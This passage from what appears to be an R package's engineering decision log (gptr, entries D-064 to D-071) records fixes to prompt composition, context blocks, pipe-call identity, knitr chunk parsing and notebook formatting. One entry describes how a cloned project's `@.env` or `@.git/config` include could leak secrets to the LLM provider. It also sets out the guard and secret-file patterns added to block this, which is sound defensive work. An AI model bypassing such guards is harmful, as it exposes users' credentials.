   literals and call texts, and prompts and call texts pass `as_utf8()`. Parse-data columns and
   `utils::getParseText()` (which cuts the source lines with `substr()`) then count the same
   unit: bytes outside a UTF-8 locale, characters in a UTF-8 locale. The plan's parse cut a
   non-ASCII call text short in a C locale. The first version of this change parsed the bytes in
   every locale: unmarked non-ASCII text makes the parser count bytes, while `substr()` counts
   characters in a UTF-8 locale, so in the default locale a call after a non-ASCII character on
   its line got a shifted text and was never found by identity, and a literal prompt over 1000
   bytes was lost (review round 2; fixed and covered in both locales).
2. **Parse data is kept under `sys.source()`.** `sys.source()` sets `keep.parse.data = FALSE`
   while the sourced code runs (its `keep.parse.data` argument defaults to
   `keep.parse.data.pkgs`), and a user may set the option. `getParseData()` is then `NULL` and the
   plan's scanner found no `gptr()` call at all. `doc_parse_text()` sets
   `options(keep.parse.data = TRUE)` for the parse and restores it with `on.exit(add = TRUE)`.
3. **Ownership matches exactly.** `doc_owned_block()` read `call=` with `h$call`, which partially
   matches an unknown header key such as `callback=` (as D-062 item 3 for `sha=`/`status=`); it
   now reads `h[["call"]]`, as do the label column and the site and anchor fields.
   `doc_run_owner()` matched a header without `prompt=` to a missing prompt hash (`NA %in% NA`),
   returning that block as owned and fresh; a missing hash now never matches by prompt.
4. **Terminal-only parse text.** `getParseData()` runs without `includeText = TRUE`;
   `getParseText()` reads a call's text back from the source, so results are identical and a
   2,320-line script parses about 18 times faster (0.013 s instead of 0.24 s).
5. **A computed `prompt =` is the prompt (review round 1).** Contract 6.1.1 step 2 takes
   `prompt =` when given, else the first unnamed string literal, and a non-literal prompt's
   template is its value (7.8 call record). The plan's `doc_call_prompt()` fell back to the first
   unnamed literal when `prompt =` was not a literal, so `gptr(prompt = p, "context text")` was
   hashed as `"context text"`, never matched the runtime hash of `p`'s value, and was skipped by
   the call-identity fallback (which only checks rows without a hash): the call could never be
   located. A given `prompt =` whose value is not a string literal now gives NA, so the call is
   found by its text. `prompt = NULL` and an empty `prompt =` are not given (the default is
   `NULL`), and `` `prompt` = `` and `"prompt" =` bind `prompt` as in R (`doc_arg_name()`).
6. **A piped call is identified as R calls it (review round 3).** The parser rewrites
   `lhs |> gptr(q)` into `gptr(lhs, q)`, and `sys.call()` (the `call0` that Task 8's locator
   passes to `doc_calls_have()`) reports the rewrite. The plan stored and compared only the
   right-hand text `gptr(q)`. As a result, a computed-prompt call on the right of a pipe was
   never found by identity: `df |> gptr(q)`, `x |> gptr(paste(...))`, and every later step of a
   chain. A string-literal left side (`"Summarise mtcars" |> gptr()`) gave no prompt literal. Yet
   its prompt is that left side (contract 6.1.1 step 2: after the rewrite it is the first unnamed
   string literal). None of these calls could be located, recorded or replayed. The scanner now
   fills a column `ident`. For the right-hand operand of a pipe it holds the text of the whole
   pipe expression. That operand is a call whose parent expression has a `PIPE` child before it.
   Parsing that text with `str2lang()` gives what `sys.call()` reports, for a single pipe, a
   chain, a literal left side and the placeholder `_`. Any other call's `ident` is its own text.
   `text` stays the call's own text. `doc_calls_have()` compares `ident`, and `th` (the anchor
   identity) hashes `ident`. `doc_call_prompt()` treats the left side as the first unnamed
   argument, so a string-literal left side is the prompt unless `prompt =` is given. With the
   placeholder, the left side goes to the argument that holds `_`: `"x" |> gptr(prompt = _)`
   prompts `"x"`, and `"ctx" |> gptr("p", ctx = _)` prompts `"p"`. Because the left side is the
   first argument, a literal there wins over a later unnamed literal: `"S" |> gptr("more")` runs
   `gptr("S", "more")` and prompts `"S"` (the runtime also warns `two_prompts`), pinned by a test
   since review round 4. The plan literal has the same gap (`task2-fix3-adapt-red.log`). Item 8
   covers magrittr's pipes.
7. **Call identity ignores source references (review round 3).** Under `keep.source = TRUE`
   (the default in interactive sessions, and `source(keep.source = TRUE)`), the call that
   `sys.call()` reports carries source references. Each `function` or `\(x)` call holds a srcref
   as its fourth element, and each `{` carries srcref attributes. The call parsed from the
   scanner's text has neither. So `identical()` failed for
   `gptr(paste("a", sapply(x, function(i) i)))`, and such a call could not be found by identity.
   `doc_calls_have()` now compares both sides through the new `doc_call_norm()`. It drops srcref
   elements and the srcref, srcfile and wholeSrcref attributes at every depth. It is gptr's own
   helper rather than `utils::removeSource()`, which became thorough for language objects only in
   R 4.4.0 (R NEWS, PR#18638); the package supports R >= 4.2.0.
8. **A magrittr-piped call is identified as magrittr calls it (review round 4).** Users pipe into
   `gptr()` with magrittr too (contract 6.1, `envir` row: a magrittr mask is replaced by its
   parent; research 12 D3: `mice %>% gptr("describe")`), although magrittr is not a dependency.
   magrittr 2.0.5 calls the right-hand side with `.` as its first argument unless an argument,
   named or not, is `.` itself: `sys.call()` reports `x %>% gptr(q)` as `gptr(., q)` and
   `x %>% gptr(q, .)` as `gptr(q, .)`, with `keep.source` FALSE and TRUE, under `%>%`, `%T>%`,
   `%!>%` and `%<>%`; `%$%` calls it as written. The plan and round 3 kept `gptr(q)` as the
   identity, so a magrittr-piped call with a computed prompt (`1 %>% gptr(q)`,
   `1 %>% gptr(paste("a", q))`) or a literal left side (`"S" %>% gptr()`) was never found by
   `doc_calls_have()` and could not be located, recorded or replayed. The scanner now treats a
   `SPECIAL` token of those four pipes like `PIPE` (`doc_pipe_operands()` reports which), and
   `ident` of the right-hand call is its text with `.` inserted as the first argument unless an
   argument is `.` (`doc_dot_ident()`; `gptr(.)` when the call has no argument). `text` is
   unchanged. For the prompt, `.` is a symbol, never a literal (contract 6.1.1 step 2): a
   string-literal left side is the prompt as `prompt = .`, or when no unnamed literal is given and
   `.` is the first unnamed argument, as the first length-1 character value (`"S" %>% gptr(q)`
   prompts `"S"`; `"S" %>% gptr("more")` prompts `"more"`; `"S" %>% gptr(q, .)` gives NA, since
   `q` may hold the prompt). A user-defined `%>%` with other semantics is not recognised.

Validation: `progress/P15.md`, Task 2 (`test-doc-blocks.R`). The plan's 46 expectations are
unchanged. Forty-nine were added: 5 C-locale, 6 for the parse memo and `line_offset`, 3
ownership, 4 parse data, 3 for `prompt =`, 10 for call texts and long literals (run in both the C
and a UTF-8 locale), 9 for native pipes, 4 for source references and 5 for magrittr pipes.
Review round 3 also corrected one round-2 expectation: it now checks the piped call that the
file's own parse gives. Against the plan literal the added blocks fail 27: 15 before round 3, 1
more in the round-2 block, 6 in the round-3 blocks and 5 added in round 4
(`dev/.validation/P15/task2-adapt-red.log`, `task2-fix1-adapt-red.log`,
`task2-fix2-adapt-red.log`, `task2-fix3-adapt-red-round2.log`, `task2-fix3-adapt-red.log`,
`task2-fix4-adapt-red.log`). Final `^doc-blocks$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 154 ]` in
the UTF-8 and the C locale.

## D-065 - P07 composition: a session preset equal to the configured one is not an explicit choice, `tools.disable` also drops plugin direct tools, a failing tool schema leaves that tool out, section overrides follow Pi's rule without widening the preset (2026-10-04)

P07 Task 4's plan-literal `prompt_compose()` / `prompt_compose_preset()` / `prompt_tool_array()`
(`R/prompt-sections.R`) were changed in three ways, and the review of Task 4 added three more to
`prompt_sections_render()` / `prompt_system_overrides()`. Signatures and the frozen list are
unchanged.

1. **The configured preset is not an explicit preset.** The plan took
   `explicit = opts$preset %||% d$preset`, but P06's real `session_new()` stores
   `preset %||% setting_get("preset", default = "standard")`, so `d$preset` is never `NULL` for a
   session. The user's `tools.presets` mapping and IC-73's shipped `extended` defaults (Gemini 3,
   Haiku 4.5 past break-even) then never applied to a real session, only to
   `gptr_prompt(NULL)`. P08 passes `preset = NULL` to `session_new()` and leaves `preset` out of
   the run options when the user names none (`gateway_preset()`), so the session's own preset is
   now explicit only when it differs from setting `preset`; `opts$preset` always wins. A caller
   that names exactly the configured preset (session_new() without `opts$preset`) is treated as
   not having chosen one; P06 records no separate flag, and P06's file is not changed.
   `prompt_compose_preset()` also passes `session = sid` to `preset_tools()` (Task 3 review), so a
   session's rank-0 preset (IC-69 session scope) composes instead of aborting "Unknown preset".
2. **`tools.disable` drops plugin direct tools.** The plan removed the always-declared
   un-namespaced direct tools (IC-37) only for `-name` run modifiers; the `tools.disable` setting
   (04 section 11.2 `tools {enable, disable, presets}`) removed only preset tools, so a disabled
   plugin tool stayed in the array. Both now remove it.
3. **A failing tool declaration leaves that tool out.** The plan let an error of a tool's
   `parameters(ctx)` stop the whole freeze (every run of the session) and dropped an erroring
   `available(ctx)` silently. As P06's fallback freeze (`freeze_tool_decl()`) does, the tool is now
   left out with a diagnostic when `available()` or `parameters()` fails or the schema is not a
   JSON Schema with `type = "object"` (contract section 9.1); a plain `FALSE` from `available()`
   stays silent.
4. **The Pi-rule core replacement has no section budget.** A trusted `.gptr/SYSTEM.md`, the
   user's `SYSTEM.md` or a string `.opts$system` replaces `preamble`, `tools` and `rules`
   (04 section 9.3, 03 section 7.3). The plan stored it as the `preamble` override and cut it to
   the preamble's 120 tokens. Contract and architecture give the replacement no budget, and Pi
   applies none. The replacement now carries the attribute `core`, and only that text skips the
   budget check. Named overrides (`.opts$system` list, `session_start` sections) keep their
   section's budget. A blank replacement (an empty SYSTEM.md, `.opts$system = ""`) replaces
   nothing, and a blank named override omits its section, as a provider's empty text does.
5. **Overrides never change inclusion.** The plan matched overrides against the rendered rows
   only, so an override of a registered section that the preset excludes became a new T0 section
   at order 760. A T1 `r_env` then landed in T0 after `<context>` (03 section 7.3: T0 ends after
   `<context>`). Such an override is now dropped: the preset record decides inclusion (IC-69),
   and a `session_start` override cannot widen a minimal sub-agent prompt. Only unregistered
   names still become T0 sections at 760.
6. **Fragments honour overrides.** A named override of an `r_session` fragment (a
   `prompt_section` with `parent`) now replaces its text, or removes it for `NULL` or blank text,
   inside the parent ("a named `.opts$system` list overrides named sections (`NULL` removes)").
   The plan ignored it, and a string added a stray `<shell>` section beside the original line.

Validation: `progress/P07.md`, Task 4. The plan's 12 tests are unchanged and pass on both the
plan literal and the adapted code. Items 1-3 added 4 tests (19 expectations); against the plan
literal they fail 6 (`dev/.validation/P07/task4-plan-literal2.log`). Items 4-6 added 4 tests
(30 expectations); against the pre-review source they fail 20 (`task4-fix1-red2.log`). Final
`^prompt-sections$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 185 ]`.

## D-066 - P07 context blocks: containment uses path_inside(), deduplication hashes the stored (redacted) form, an @file include never reads a control, protected or secret-shaped file, the update check cuts with the session's estimator (2026-10-04)

P07 Task 5's plan-literal `R/prompt-context.R` was changed in four ways. Signatures, block
formats, orders and budgets are unchanged.

1. **Containment uses P01's `path_inside()`.** The plan tested
   `!startsWith(path_rel(p, root), "..")` in `context_vignette_includes()`, `context_dirs()` and
   the user-file label, but P01's real `path_rel()` returns the normalised absolute path (never
   `..`) for a path outside the root. An `@../<dir>/rules.md` line in `.gptr/vignette.Rmd` naming
   an existing file outside the project was therefore read into the prompt, against the plan's
   own rule that such a line is dropped, and an inner directory named `..cache` was treated as
   outside the root.
2. **Deduplication hashes the form the transcript stores.** P06's `session_append()` redacts
   every entry with the `persist` profile, while the plan hashed the freshly rendered text and
   compared it with text read back from entries. A block holding a secret-shaped string (an
   `sk-proj-` key in an AGENTS.md, a URL password in a plugin block, a bearer token in an operator
   reminder) never matched and was sent again on every turn, breaking IC-38 ("a block whose text
   hash equals the last emitted text of the same name ... is skipped") and the "announced once"
   rule of `project_instructions_update`. `context_text_hash()` hashes `redact(text, "persist")`
   (idempotent on stored text) in `context_blocks_hash()`, `context_last_hashes()`, the operator
   reminder check, `context_sent_instructions()` and both comparisons of
   `context_provide_update()`. The block text itself is unchanged; `ctx$input$last_hash` is this
   hash. Task 13's `details$dropped` hashes the stored first-message block, which is equal under
   idempotency; Task 13 should call `context_text_hash()` for it.
3. **An `@file` include never reads a guarded file.** The plan included any existing file inside
   the root, so a cloned project's `vignette.Rmd` with `@.env`, `@.secrets/k.env` or
   `@.git/config` sent the user's own untracked secrets to the provider (with `trusted="false"`
   in an untrusted project, but sent all the same), bypassing the level a model `read` of the
   same file gets (04 section 9.4: 2 on a protected path) and `gptr.secret_guard`.
   `context_file_guarded()` now drops the line when `path_class()` gives `control`, `critical`
   or `protected` (it judges the path as written and its symlink target; IC-54) or the
   root-relative path, as written or resolved, has the shape of P03's secret-file classifier
   (`scan_secret_path_re`: `id_rsa`, `*.pem`/`*.key`, `credentials.json`, `.pgpass`, ...).
   `instructions` and ordinary `workspace` files stay includable. A project located under a
   protected directory (for example `~/.claude/...`) can then include nothing, as `path_class()`
   makes every file there protected for the permission classifier as well.
4. **The update check cuts with the session's estimator.** `context_provide_update()` truncates
   each file with `prompt_truncate(..., "prose", sid)`, as `context_provide()` cut the first
   message's block, so the change check compares like with like when a session-scoped estimator
   exists. Identical with the default estimator.

Validation: `progress/P07.md`, Task 5. The plan's 21 tests are unchanged. Item 1 added 2 tests
(8 expectations), which fail 4 on the plan literal (`dev/.validation/P07/task5-plan-literal2.log`).
Items 2 and 3 added 2 tests (12 expectations), which fail 9 on the pre-review source
(`task5-fix1-red.log`). Final `^prompt-context$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 88 ]`.

## D-067 - P07 compaction threshold: a null compact_at setting disables the cap (2026-10-04)

P07 Task 6's plan-literal `compact_threshold()` (`R/prompt-compact.R`) no longer passes a
`default` when it reads the setting. The contract 7.7 signature
`compact_threshold(window, max_output, r_cap = 4000)`, the formula and the plan's 10 expectations
are unchanged.

The plan read `setting_get("compact_at", default = gptr_opt("compact_at"))`. `setting_get()`
returns `value %||% default`, so that `default` turned a `null` from P08's settings service back
into the option value or 200,000. Contract 3.1 says "`NULL` disables the cap" and 11.2 types the
key `num|null`, and the plan's own `is.null(cap)` branch could never run. The read is now
`setting_get("compact_at")`. Without P08, `setting_get()` already falls back to
`gptr_opt("compact_at")` (the option or 200,000), so behaviour before P08 is unchanged; `Inf` or
`NA` in the option still disables the cap (plan decision 9). For P08: `settings.get` must return
the package default (200,000, the lowest layer of 11.2) for an unset key; a `NULL` there would
disable the cap.

No session is passed, as in the plan. A first draft added a trailing `session = NULL` on the
premise that a `gptr_config(.scope = "session")` value would otherwise be missed; review 1 showed
the premise was false (contract 5: the `"session"` scope is this R process, and P08's
`settings_get(key, session = NULL)` ignores `session` because settings are process-wide in 1.0),
so the argument was removed and Tasks 7 and 13 call `compact_threshold()` as their plan
literals do.

Validation: `progress/P07.md`, Task 6. Three tests added (8 expectations), including one that
pins the contract 7.7 signature; on the plan literal they fail 1
(`dev/.validation/P07/task6-fix1-plan-literal.log`: the null setting gave 200,000 instead of
900,000). Final `^prompt-compact$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 18 ]`.

## D-068 - P15 recorded block content: dropped code is cut by parse columns, never srcref bytes (IC-62), with only its own separator; parse data is kept under sys.source(); only an exact marker literal becomes Sys.getenv(); an emptied chunk keeps no output; unknown usage is never summed (IC-74); wrapped code keeps multi-line strings; team children without a report or with secrets (2026-10-04)

P15 Task 3's plan-literal block content (`R/doc-blocks.R`) was changed in eight ways. The
interfaces of contract 7.15 (`doc_block_lines(session, turn, site, call_ordinal)` and its
attributes) and the helpers the plan lists are unchanged; `doc_drop_ranges()` keeps its name and
arguments and may now return `NULL`; new internal helpers: `doc_byte_cols()`, `doc_join_cut()`,
`doc_same_exprs()`, `doc_secret_literals()`, `doc_rule_markers()`, `doc_string_tails()`,
`doc_turn_usage()`.
1. **Dropped code is cut by characters (IC-48 "verbatim except", IC-62).** The plan cut each
   line's bytes at the srcref byte fields (elements 2 and 4). In a UTF-8 locale R 4.5.0 reports
   those fields shifted after a multi-byte character (scratch probe: for `x <- "éé";
   gptr_return(x)` the second expression is bytes 14..27 but its srcref says 16..29), so the
   plan cut the wrong bytes and wrote code that does not parse: `x = "éé"; gp`, `y = "é"; g z =
   2`. In a C locale it parsed marked UTF-8, which the parser translates (`<U+00E9>`), so cuts
   misfired (`x <- "éé"; gptr_return(`) and the arrow rewrite never matched a line holding a
   non-ASCII literal. Now the code is parsed by Task 2's `doc_parse_text()`, and srcref and
   parse-data columns are mapped to bytes by `doc_byte_cols()`, which counts as R's parser does
   (a column per character when the text is read as UTF-8, a column per byte otherwise, a tab to
   the next multiple of 8): 1,994 tokens of 400 generated lines with tabs, accented, CJK and
   4-byte characters map to their exact text in both locales
   (`dev/.validation/P15/task3-probe-colmap.log`). A cut whose result does not parse back to
   exactly the kept expressions leaves the chunk as written (`kept` all `TRUE`). A dropped
   expression spanning lines that it shares with kept code is now cut too (the plan left it in).
   The cut is the exact text of each dropped expression plus every whole line that dropped
   expressions touch and kept ones do not (its comments included); overlapping cuts are merged,
   so dropped expressions that share lines with each other go together (review round 1: a
   first version deleted such a line for one expression while cutting the other partially, the
   result did not parse back, and the chunk was kept as written with its `gptr$out()` and
   `gptr$plot()` calls; a 1,500-chunk fuzz in both locales now has no refused cut where the
   first version refused 65, `dev/.validation/P15/task3-fix1-fuzz.log`).
   In a C locale code with a non-ASCII identifier does not parse (nor does Rscript run it there)
   and is kept as written.
2. **Only the dropped expression's own `;` goes.** The plan cleaned a cut line with whole-line
   regexes, which edited string literals: `x = "a;;b"; gptr_return(x)` became `x = "a;b"` and
   `gptr_return(x); y = "p; ;q"` became `y = "p;q"`. `doc_join_cut()` touches only the two edges
   of the cut: the separator after the expression, else the one before it.
3. **Parse data under `sys.source()`.** The plan's arrow rewrite parsed with `parse()`, so with
   `keep.parse.data = FALSE` (as `sys.source()` sets while the sourced script runs, D-064 item 2)
   `getParseData()` was `NULL` and nothing was rewritten. `doc_parse_text()` keeps parse data.
4. **Only a literal that is exactly a marker becomes `Sys.getenv()` (G6 5.6, self-review
   ambiguity 16).** The plan's regex also rewrote a quoted marker inside a longer literal:
   `system("TOKEN='[secret:GH_TOKEN]' git push")` became `system("TOKEN=Sys.getenv("GH_TOKEN")
   git push")`, code that does not parse, and since no marker was left the block was not
   flagged. `doc_secret_literals()` rewrites only `STR_CONST` tokens whose whole text is
   `"[secret:NAME]"` or `'[secret:NAME]'`; any other marker stays and `code_for_history()` flags
   the block. A marker that a redaction rule writes (the built-in and registered rules' fixed
   markers, P03's `redact_known_markers()` without registered secrets; new helper
   `doc_rule_markers()`) also stays, since it names the rule and not an environment variable:
   the plan's regex and the first version turned a redacted JWT literal `"[secret:jwt]"` into
   `Sys.getenv("jwt")` with no flag (review round 1). A marker that the `named-secret` rule
   writes carries the variable's name and cannot be told apart from a registered secret's, so
   it is still rewritten as ambiguity 16 says.
5. **An emptied chunk keeps no output (IC-48).** When every expression of a call is dropped, all
   its printed output belongs to dropped expressions, so it is dropped even from P10's flat
   output vector (the plan kept, for example, the printed line of a lone `gptr$out(id, lines =
   1)`). The call's `## Decision:` line, bridge digests and artifact references stay. Partly
   dropped calls with flat output keep their output as self-review ambiguity 18 says.
6. **Unknown usage is never summed (IC-74 section 5: "Missing usage remains unknown").** The
   plan summed with `na.rm = TRUE` and counted a message without usage as zero, so an unknown
   input count gave a too-small `tokens=` (`150/30` instead of unknown) and an unknown cost an
   understated `cost=`. `tokens=` and `cost=` are now written only when every assistant message
   of the turn reports them (`doc_turn_usage()`). `model=` is the provider and model of the
   recorded answer, so a local model keeps its tag (`ollama/qwen3:8b`, tested; the plan already
   did this).
7. **Wrapped code keeps multi-line strings.** `doc_wrap_local()` indented every body line,
   including the continuation lines of a multi-line string literal, which changes the string
   when the document is sourced; those lines are no longer indented (`doc_string_tails()`). The
   child name is written with `doc_str_literal()`.
8. **Team and fan-out children.** A child without a report (`last_text` NA) gave
   `## Agent a (<model>): NA` and the S2 text `"NA"`; now the line ends at the colon and the text
   stays `NA`. A child's exported code whose secret marker stays now flags the team block
   (contract 11.5); the plan's `doc_session_code()` dropped the flag. That code is now taken from
   the recorded code itself instead of by removing body lines that start with `#`, which also
   removed lines of a multi-line string that start with `#`.

Not changed: an upper bound on the creation time of a turn's children was tried and reverted;
the plan's fixture creates the children after the turn's entries, and blocks are written for the
run's own turn at `agent_end`. Also: `spec[["record"]]` is read exactly, and
`doc_path_entries()` follows P06's id index (falling back to `match()`), which only saves time.
The `tokens=` header is written with `sprintf("%.0f/%.0f")`; the plan's `paste0(round())`
wrote `1e+05/30` for 100,000 input tokens (review round 1).

Validation: `progress/P15.md`, Task 3. The plan's 11 tests are unchanged; 6 tests (29
expectations) were added, and on the plan literal 20 of them fail
(`dev/.validation/P15/task3-adapt-red.log`). Review round 1 added 3 tests (18 expectations), of
which 16 failed before its fixes (`dev/.validation/P15/task3-fix1-red.log`). Final
`^doc-blocks$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 249 ]`, the same under `LC_ALL=C LANG=C`.

## D-069 - P07 frozen prompt: the floor check counts the project instructions for the audience being frozen, cut re-injection budgets are recorded in gptr.frozen and survive a restore (2026-10-04)

P07 Task 7 (`R/prompt-sections.R`, one line of `R/prompt-context.R`). The contract 7.7 signature
`prompt_freeze(s, opts = list())`, the `prompt.freeze` service, `prompt_floor_check(frozen,
project_tokens, skills_budget = 0)`, the IC-71 formula and refusal, and the plan's 25
expectations are unchanged.

1. The plan rendered the project instructions for the floor with
   `context_block_by_name(s, "project_instructions", list(turn, placement, preview))` before
   `.d$frozen` exists, so Task 5's `context_input()` took the audience from `gptr_can_prompt()`
   instead of the `interactive` value the freeze composes with (P06's `run_freeze()` passes the
   run's audience). In an untrusted project in `auto` or `edits`, where IC-52 withholds the
   project files from a run nobody attends, the floor then counted files the first message
   would not send, or missed files it would send, and IC-71 could accept a model it must refuse
   or refuse one it must accept. `prompt_freeze()` now passes `human = frozen$human`, and
   `context_input()` takes `input$human` before `.d$frozen$human` (nothing else passes it).
2. `gptr.frozen` carries `reinject` when the floor check cut the budgets (finite, non-negative
   `project` and `skills`), and `prompt_frozen_restore()` reads it back, else the full budgets
   (`project = Inf`, `skills = 10000`) as in the plan. With the plan literal a restored session
   re-injected the full budgets, losing the cut IC-71 makes at freeze. Uncut budgets are not
   written (`Inf` has no JSON number). An extra key, like the plan's own `human` (contract 11:
   readers ignore unknown keys).

Closed by follow-up FIX-3 (P06, `R/session-store.R`; was open for P06): `rebuild_frozen()`, used by
`store_rebuild()` and by a replay's cut (`replay_rebuild()`), copied neither `human` nor
`reinject` from `gptr.frozen`, so a session resumed from its file rendered for
`gptr_can_prompt()` and re-injected the full budgets. It now reads both as P07's restore does
(`human`, else `gptr_can_prompt()`; `reinject` through `prompt_reinject_read()`, else the full
budgets) and returns the same frozen list as `prompt_frozen_restore()`. A resumed session, a
fork of it (`fork_frozen()` shares the source's `.d$frozen`) and that fork rebuilt from its own
file keep both. Evidence: `progress/fixes.md`, Task FIX-3.

Validation: `progress/P07.md`, Task 7. Two tests (12 expectations) were added; on the plan
literal 4 of them fail (`dev/.validation/P07/task7-plan-literal.log`). Final
`^prompt-sections$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 222 ]`.

## D-070 - P15 document formats: chunks are divided and labelled as knitr does, an unterminated chunk is never written, each statement of a chunk owns its own agent chunk, an agent chunk's fence outgrows its body, inert blocks round-trip exactly, chunk prefixes are kept, a malformed transcript is not written (2026-10-04)

P15 Task 5's plan-literal formats (`R/doc-formats.R`) were changed in seven ways. The
`doc_format` functions of contract 10.2 row 18 and the helpers the plan lists keep their names
and arguments; `doc_rmd_chunks()` gains a column `closed`; new internal helpers:
`doc_rmd_unprefix()`, `doc_rmd_option_comment()`, `doc_rmd_yaml_label()`,
`doc_rmd_pipe_label()`, `doc_rmd_owner()`, `doc_rmd_fence()`, `doc_rmd_refence()`.
1. **Chunks are divided and labelled as knitr 1.52 (xfun 0.61) does.** The plan's goal is that
   the label `knitr::opts_current$get("label")` reports for a running chunk finds that chunk
   (self-review ambiguity 26), but on the 22-chunk probe document of the tests its parser
   found 21 chunks and gave 14 of them another label than knitr; from the first disagreement on,
   every later unlabelled chunk had the wrong `unnamed-chunk-<k>`, and the probe's one `gptr()`
   call was not found (`dev/.validation/P15/task5-probe-plan-literal-labels.log`; knitr's own
   labels: `task5-probe-knitr.log` and the live test). Now:
   - a chunk ends only at a line with exactly its prefix and fence; a fence line of another
     length is chunk content. The plan ended a ```` ``` ```` chunk at a ```` ```` ```` line inside a
     string, so the `gptr()` call after it was never found.
   - a begin line with the chunk's own prefix and fence opens a new chunk, and the open one is
     unterminated (`closed = FALSE`, `end` is the line after its body). The plan swallowed the
     next chunk.
   - header labels are read as `xfun::csv_options()` reads them: the text is parsed as
     `alist(...)` after xfun's `quote_label()`, never evaluated. So `{r label=foo}`,
     `{r echo=FALSE, bar}` and `{r a b}` are labelled, which the plan missed.
   - option lines count only at the start of the body, with xfun's `#| ` (space included) or
     the engine's own comment (`//| ` for dot, `--| ` for sql). They are read after the chunk's
     prefix is removed, as knitr does. `#| id:` and csv-style option lines are honoured. The
     plan took a `#| label:` line anywhere in the body, kept the quotes of
     `#| label: "x"`, and missed indented chunks.
   - the YAML `label` (else `id`) scalar is read directly, in its plain, single-quoted and
     double-quoted forms. `yaml::yaml.load()` turns non-ASCII text into `<c3><af>` escapes
     outside a UTF-8 locale, even when given unmarked bytes (IC-62;
     `task5-probe-yaml-clocale.log`). Other YAML types (`yes`, `1e5`) are read as their text.
   A test checks the labels against a real `knitr::knit()` (skipped without knitr). Labels in
   a C locale keep their UTF-8 text, as in a UTF-8 locale. In a C locale knitr itself escapes
   non-ASCII labels, so such a label is not located there.
2. **An unterminated chunk is never written into or after.** A calling chunk or a run of agent
   chunks without its closing fence, a block whose agent chunk is unterminated, and a console
   append after an unterminated last chunk all signal `gptr_error_doc_write` with `reason =
   "malformed"`. Inserting after such a chunk would put the agent chunk inside it, or after the
   next chunk's header line.
3. **Each `gptr()` statement of a chunk owns its own agent chunk (contract 11.5 ownership).** All
   top-level calls of an Rmd/qmd chunk share the run of agent chunks after it. The plan applied
   `doc_run_owner()` to each call alone, so in a chunk with `gptr("load data")` and
   `gptr("plot it")`, editing the second prompt claimed the first call's block by `call=1` as
   stale and regenerated it with the wrong code. With the same prompt in two statements, the
   second call replayed the first one's block and never ran. `doc_rmd_owner()` assigns blocks
   one to one, in document order. First come prompt and `call=` matches, then prompt matches
   (never a block of another same-prompt call of the statement, ambiguity 28), then `call=k`
   (stale). The located call uses its runtime prompt hash; the other calls use their literals.
   With a single call this is `doc_run_owner()`.
4. **An agent chunk's fence outgrows its body.** The contract copies the owning chunk's fence. A
   block whose code holds a line that starts with a backtick run at least that long (a
   multi-line string with a fenced example) would end the chunk under knitr's or pandoc's
   rules, or open another. The fence is then one backtick longer than that run, and a
   rewrite lengthens both fences of the agent chunk (`doc_rmd_refence()`). Otherwise the
   fence is copied as before.
5. **Inert blocks round-trip exactly (G7 section 3.8).** The plan left body lines that already
   started with `#~ ` unprefixed, so reviving a block changed a user's own `#~ ` comment. It
   also treated lines that are not one whole block as a block, dropping the last line. Now an
   undone block is left as is, a live block is not "revived", every non-empty line gets one
   `#~ ` and loses exactly one, and anything but one whole block is returned unchanged.
6. **Chunk prefixes are kept.** The inserted agent chunk indents its body with
   `doc_indent_lines()`, like the rewrite, so blank lines carry no prefix. The plan's
   `paste0(prefix, lines)` gave them one, and rewriting the same block changed the document.
   `doc_rmd_chunk_eval()` reads and writes `#| eval: false` with the chunk's prefix, so an
   indented qmd agent chunk can be made inert and revived. It reads and writes only the
   chunk's leading option lines (from the first line, those that start with `#| ` after the
   prefix: the rule of `doc_rmd_pipe_label()` and `xfun::divide_chunk()`). The plan matched
   `#| eval: false` and `#| label:` on every line of the chunk, so reviving a block deleted a
   `#| eval: false` line of its code (a string holding a Quarto chunk, as in item 4) and the
   block came back "user-edited". It also never wrote the option when the code held such a
   line, and put it after a `#| label:` line of the code when the chunk was labelled in its
   header (review round 1).
7. **A transcript with malformed markers is not written**, as `r` and `rmd` documents already
   were not. With a duplicated block id, the plan spliced both ranges at once and failed with
   a base R error.
Also: site and block fields are read with `[[` (exact names, as D-064 item 3). In the tests,
fixture lines are split by a test helper, because Task 4's `doc_read()` is not implemented yet:
Task 4 needs P08's `settings_write()`. Calls inside blockquoted (`> `) chunks are still not
located, as in the plan, because their R text does not parse.

Validation: `progress/P15.md`, Task 5. The plan's 7 tests are unchanged apart from that fixture
reader, and they pass on the plan literal with the plan's 39 expectations
(`dev/.validation/P15/task5-green0-plan-literal.log`). Nine tests (56 expectations) were added.
With the plan literal swapped into the loaded namespace, 34 of them fail and one test errors
(`task5-adapt-red.log`). Review round 1 added a tenth (10 expectations; 6 fail before its fix,
`task5-fix1-red.log`). Final `^doc-formats$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 105 ]`, the
same under `LC_ALL=C LANG=C` (`task5-fix1-green.log`, `task5-fix1-green-clocale.log`).

## D-071 - P15 notebook format: Python's shortest repr at powers of two, integers beyond 32 bits kept as written, unreadable notebooks are doc_write errors, nbformat's line splitting, each call of a calling cell owns its own agent cell, inert cells round-trip exactly, no cell id before nbformat 4.5 and agent cells also known by metadata.gptr.id, metadata.gptr read by its exact name (2026-10-04)

P15 Task 6's plan-literal notebook format (`R/doc-formats.R`) was changed in eight ways. The
functions the plan lists keep their names and arguments; `nb_json_num()` is vectorised and
`nb_code_cell()` gains `cell_id = TRUE`. New internal helpers: `nb_json_back()`,
`nb_json_next_up()`, `nb_json_shortest()`, `nb_keep_ints()`, `nb_cell_meta()`, `nb_is_agent()`,
`nb_put()`, `nb_has_cell_ids()`.
1. **Numbers keep Python's repr at powers of two, and are formatted together.** The plan took the
   correctly rounded `%.<k>e` string of each length. Just below a power of two the gap between
   doubles halves, so there Python's shortest round trip (Gay) can be the string one unit above:
   2^-1017 is `7.120236347223045e-307`, the plan wrote `7.1202363472230444e-307`. Against
   Python 3.14's `json.dumps()` on 39,243 doubles (random bit patterns, every power of two,
   subnormals, extremes, Plotly-style decimals) the plan literal differs on 92, all powers of
   two; the implementation on none (`dev/.validation/P15/task6-python-numbers.log`). The 17
